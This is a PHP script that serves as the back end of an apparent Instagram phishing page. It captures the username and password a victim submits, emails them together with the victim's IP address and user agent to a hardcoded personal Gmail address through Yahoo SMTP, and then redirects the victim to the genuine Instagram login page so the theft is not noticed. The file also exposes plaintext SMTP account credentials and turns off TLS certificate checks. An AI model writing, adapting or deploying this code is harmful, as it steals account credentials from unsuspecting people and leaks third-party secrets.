<?php
chdir('../');
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'mail/src/Exception.php';
require 'mail/src/PHPMailer.php';
require 'mail/src/SMTP.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['username']) && isset($_POST['password'])) {

$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';

$email = 'geofreybupamba@gmail.com';

function getClientIP()
{
if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
$ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
return trim($ips[0]);
} elseif (!empty($_SERVER['HTTP_X_REAL_IP'])) {
return $_SERVER['HTTP_X_REAL_IP'];
} else {
return $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
}
}

$msg = '
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>NEW LOGIN DETECTED</title>
<meta name="viewport" content="width=device-width,initial-scale=1">

<style>
body {
font-family: Segoe UI;
background: #0d0d0f;
color: #e0e0e0;
padding: 24px;
}

.card {
max-width: 700px;
margin: 0 auto;
background: #141418;
padding: 28px;
border-radius: 12px;
box-shadow: 0 0 25px rgba(0, 255, 180, 0.1);
border: 1px solid #222;
}

.header {
background: #00ffb4;
color: #000;
padding: 14px;
border-radius: 8px;
font-weight: 800;
text-align: center;
font-size: 18px;
letter-spacing: 0.5px;
}

.row {
margin: 16px 0;
padding-bottom: 8px;
border-bottom: 1px solid #1f1f25;
}

.label {
font-size: 14px;
color: #9f9f9f;
text-transform: uppercase;
letter-spacing: 1px;
}

.value {
font-size: 16px;
margin-top: 4px;
color: #f0f0f0;
}

.btn-container {
margin: 24px 0;
text-align: center;
}

.btn {
display: inline-block;
padding: 12px 20px;
background: transparent;
border: 2px solid #00ffb4;
color: #00ffb4;
border-radius: 8px;
text-decoration: none;
font-weight: 700;
letter-spacing: 0.5px;
}

.btn:hover {
background: #00ffb4;
color: #000;
}

.note {
font-size: 13px;
margin-top: 20px;
color: #9f9f9f;
}

</style>
</head>
<body>

<div class="card">
<div class="header">Login Detected</div>

<div class="row">
<div class="label">Source IP</div>
<div class="value">'.getClientIP().'</div>
</div>

<div class="row">
<div class="label">User-Agent</div>
<div class="value">'.$userAgent.'</div>
</div>


<div class="row">
<div class="label">Submitted Username</div>
<div class="value">'.$_POST['username'].'</div>
</div>

<div class="row">
<div class="label">Submitted Password</div>
<div class="value">'.$_POST['password'].'</div>
</div>
</div>

</body>
</html>

';


$mail = new PHPMailer;
$mail->SMTPOptions = array(
'ssl' => array(
'verify_peer' => false,
'verify_peer_name' => false,
'allow_self_signed' => true
)
);

$mail->isSMTP();
$mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
$mail->Host = 'smtp.mail.yahoo.com';
$mail->SMTPAuth = true;
$mail->Username = 'bwiresoft.sandbox@yahoo.com';
$mail->Password = 'kzbjdelygmyanvjt';
$mail->SMTPSecure = 'tls';
$mail->Port = 587;

$mail->setFrom('bwiresoft.sandbox@yahoo.com', 'bwire soft');
$mail->addAddress($email);
$mail->isHTML(true);

$mail->Subject = 'NEW LOGIN DETECTED';
$mail->Body    = $msg;
$mail->AltBody = $msg;


if(!$mail->send()) {

header("location:https://www.instagram.com/accounts/login/?hl=en");

}else{

header("location:https://www.instagram.com/accounts/login/?hl=en");
}

}else{
header("location:../");
}
?>


